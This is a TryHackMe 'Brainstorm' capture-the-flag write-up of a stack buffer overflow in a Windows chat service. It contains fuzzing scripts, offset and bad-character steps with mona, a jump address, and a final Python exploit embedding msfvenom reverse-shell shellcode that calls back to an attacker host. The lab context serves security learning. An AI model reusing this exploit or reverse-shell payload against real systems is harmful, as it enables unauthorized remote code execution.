# Brainstorm THM
This machine talk us on a Reverse Enginner a chat program , and to write a script to exploit the machine ! 

So lets begin 

### nmap 

```shell

sudo nmap -sC -sV 10.10.198.86 -Pn -P
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 12:56 CDT
Nmap scan report for 10.10.198.86
Host is up (0.22s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  tcpwrapped
|_ssl-date: 2022-05-20T18:00:16+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=brainstorm
| Not valid before: 2022-05-19T17:00:18
|_Not valid after:  2022-11-18T17:00:18
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=5/20%Time=6287D673%P=x86_64-pc-linux-gnu%r(NU
SF:LL,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter
SF:\x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetRequest
SF:,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x
SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes
SF:sage:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(
SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character
SF:s\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome\x2
SF:0to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usern
SF:ame\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(J
SF:avaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20e
SF:nter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\
SF:x20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20cha
SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch
SF:aracters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcome\x
SF:20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20user
SF:name\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(
SF:RPCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2
SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20
SF:a\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brainst
SF:orm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x
SF:2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusReques
SF:tTCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ent
SF:er\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x2
SF:0message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(bet
SF:a\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\)
SF::\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\x20
SF:Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20
SF:\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Terminal
SF:ServerCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPleas
SF:e\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write
SF:\x20a\x20message:\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 212.81 seconds


```


Soooo a bunch of things , we found and ftp a web server and some strange service on 9999 , so now lets see what we can do with the 21 port and 3399

## OK , IM WRITTING THIS A WEEK LATER , 

The exploit in this is a buffer overflow , we got the exe , and the dll function , the problem was the freaking download from the FTP , 

****SO HERE IT IS ON HOW TO SOLVE IT , ON THE FTP , FIRST OF ALL , WE NEED TO RUN **binary** , AFTER THAT ALL THE DOWNLOAD MADE FROM THE FTP , ARE SECURE  AND COMPLETE . ****

So after this i made a win 7 x32 machine , install Immunity Debugger , and download mona.py

And run 

`!mona config -set workingfolder c:\mona\%p`

So lets start , all the baseline on this machine im getting it from #Buffer-Overflow Prep THM. 

So lets fuzz first , and for that im changin a python script , to check how many bytes this machine can take  . 

```shell


#!/usr/bin/python 

import sys, socket

ip = '192.168.195.149'
port = 9999
buffer = ['A']
counter = 100

while len(buffer) <= 30:
    buffer.append('A'*counter)
    counter = counter + 100
try:
    for string in buffer:
        print '[+] Sending %s bytes...' % len(string)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)
        s.recv(1024)
        s.send("davs" '\r\n')
        s.recv(1024)
        s.send(string + '\r\n')
        print '[+] Done'
except:
    print '([!] A connection cant be stablished to the program. It may have crashed.)'
    sys.exit(0)
finally:
    s.close()


```

So with this we can check the max output until the buffer is full . 

So after this we need to run a pattern on msf so we run this 

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200`

```python


#!/usr/bin/python 

import sys, socket

ip = '192.168.195.149'
port = 9999
buffer = ['pattern_create.rb -l 2200`']
counter = 100

while len(buffer) <= 30:
    buffer.append('A'*counter)
    counter = counter + 100
try:
    for string in buffer:
        print '[+] Sending %s bytes...' % len(string)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)
        s.recv(1024)
        s.send("davs" '\r\n')
        s.recv(1024)
        s.send(string + '\r\n')
        print '[+] Done'
except:
    print '([!] A connection cant be stablished to the program. It may have crashed.)'
    sys.exit(0)
finally:
    s.close()

```

And on immunnity we run mona to check for the offset of the EIP 

`!mona findmsp -distance 2200`

Log data, item 21
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x31704330 (offset 2012)


So we have that the offset is 2012

Now lets build a exploit with the offset we got 


```python


#!/usr/bin/python 

import sys, socket

ip = '192.168.195.149'
port = 9999
offset = 2012
buffer = ["A"*offset + "B"*4 ]
counter = 100

while len(buffer) <= 30:
    buffer.append('A'*counter)
    counter = counter + 100
try:
    for string in buffer:
        print '[+] Sending %s bytes...' % len(string)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)
        s.recv(1024)
        s.send("davs" '\r\n')
        s.recv(1024)
        s.send(string + '\r\n')
        print '[+] Done'
except:
    print '([!] A connection cant be stablished to the program. It may have crashed.)'
    sys.exit(0)
finally:
    s.close()

```



We got the offset so now we need to check for the bad chars so we can exclude them , we know that "/x00" is the first one , so we can add that.  

On mona we need to run 
``!mona byte_array -b "\x00"


Then we need to check for the jmp , or the ESP register on the CPU 

There are two ways of getting this with the jmp , or the ESP 

### For the JMP 

We need to run 

`   !mona jmp -r esp   `

And we are going to get the character on mona like this 

![[jmp.png]]

To get the pointers , we get the bad chars direction but in endian format ,we need to change it from big endian to little 

so we can use this > https://www.save-editor.com/tools/wse_hex.html#littleendian
```hex
from 
0x625014df
to
DF145062
```
And make the changes , we are going to get this 

`   "\xdf\x14\x50\x62"   `

So this we need to add it to our buffer and prepare the payload , in our case with msfvenom 


`msfvenom -p windows/shell_reverse_tcp LHOST=10.13.41.190 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\xa0\xa1\x2e\x2f" -f py`

And our final payload.py is going to be like this > 

```python

#!/usr/bin/python 

import sys, socket

ip = '192.168.195.149'
port = 9999

buf =  b""
buf += b"\xdb\xd2\xba\x4e\x2b\x78\x73\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x83\xef\xfc\x31\x57\x13\x03\x19\x38\x9a"
buf += b"\x86\x59\xd6\xd8\x69\xa1\x27\xbd\xe0\x44\x16\xfd\x97"
buf += b"\x0d\x09\xcd\xdc\x43\xa6\xa6\xb1\x77\x3d\xca\x1d\x78"
buf += b"\xf6\x61\x78\xb7\x07\xd9\xb8\xd6\x8b\x20\xed\x38\xb5"
buf += b"\xea\xe0\x39\xf2\x17\x08\x6b\xab\x5c\xbf\x9b\xd8\x29"
buf += b"\x7c\x10\x92\xbc\x04\xc5\x63\xbe\x25\x58\xff\x99\xe5"
buf += b"\x5b\x2c\x92\xaf\x43\x31\x9f\x66\xf8\x81\x6b\x79\x28"
buf += b"\xd8\x94\xd6\x15\xd4\x66\x26\x52\xd3\x98\x5d\xaa\x27"
buf += b"\x24\x66\x69\x55\xf2\xe3\x69\xfd\x71\x53\x55\xff\x56"
buf += b"\x02\x1e\xf3\x13\x40\x78\x10\xa5\x85\xf3\x2c\x2e\x28"
buf += b"\xd3\xa4\x74\x0f\xf7\xed\x2f\x2e\xae\x4b\x81\x4f\xb0"
buf += b"\x33\x7e\xea\xbb\xde\x6b\x87\xe6\xb6\x58\xaa\x18\x47"
buf += b"\xf7\xbd\x6b\x75\x58\x16\xe3\x35\x11\xb0\xf4\x3a\x08"
buf += b"\x04\x6a\xc5\xb3\x75\xa3\x02\xe7\x25\xdb\xa3\x88\xad"
buf += b"\x1b\x4b\x5d\x61\x4b\xe3\x0e\xc2\x3b\x43\xff\xaa\x51"
buf += b"\x4c\x20\xca\x5a\x86\x49\x61\xa1\x41\xb6\xde\x6a\x13"
buf += b"\x5e\x1d\x6c\x15\x24\xa8\x8a\x7f\x4a\xfd\x05\xe8\xf3"
buf += b"\xa4\xdd\x89\xfc\x72\x98\x8a\x77\x71\x5d\x44\x70\xfc"
buf += b"\x4d\x31\x70\x4b\x2f\x94\x8f\x61\x47\x7a\x1d\xee\x97"
buf += b"\xf5\x3e\xb9\xc0\x52\xf0\xb0\x84\x4e\xab\x6a\xba\x92"
buf += b"\x2d\x54\x7e\x49\x8e\x5b\x7f\x1c\xaa\x7f\x6f\xd8\x33"
buf += b"\xc4\xdb\xb4\x65\x92\xb5\x72\xdc\x54\x6f\x2d\xb3\x3e"
buf += b"\xe7\xa8\xff\x80\x71\xb5\xd5\x76\x9d\x04\x80\xce\xa2"
buf += b"\xa9\x44\xc7\xdb\xd7\xf4\x28\x36\x5c\x14\xcb\x92\xa9"
buf += b"\xbd\x52\x77\x10\xa0\x64\xa2\x57\xdd\xe6\x46\x28\x1a"
buf += b"\xf6\x23\x2d\x66\xb0\xd8\x5f\xf7\x55\xde\xcc\xf8\x7f"

buffer = ["A"*2012 + "\xdf\x14\x50\x62"+"\x90"*20+buf ]

try:
    for string in buffer:
        print '[+] Sending %s bytes...' % len(string)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)
        s.recv(1024)
        s.send("davs" '\r\n')
        s.recv(1024)
        s.send(string + '\r\n')
        print '[+] Done'
except:
    print '([!] A connection cant be stablished to the program. It may have crashed.)'
    sys.exit(0)
finally:
    s.close()
```

And we are in !!!!

We complete this room , i like this room becouse i found another way to get the badchars , as in Buffer-Overflowe Prep , less caotic , and more fun , the only problem i got was setting up mona , and dowloading the exe on ftp , now i know that to download big files of ftp i need to write binary first on the CLI , and then get the file . 

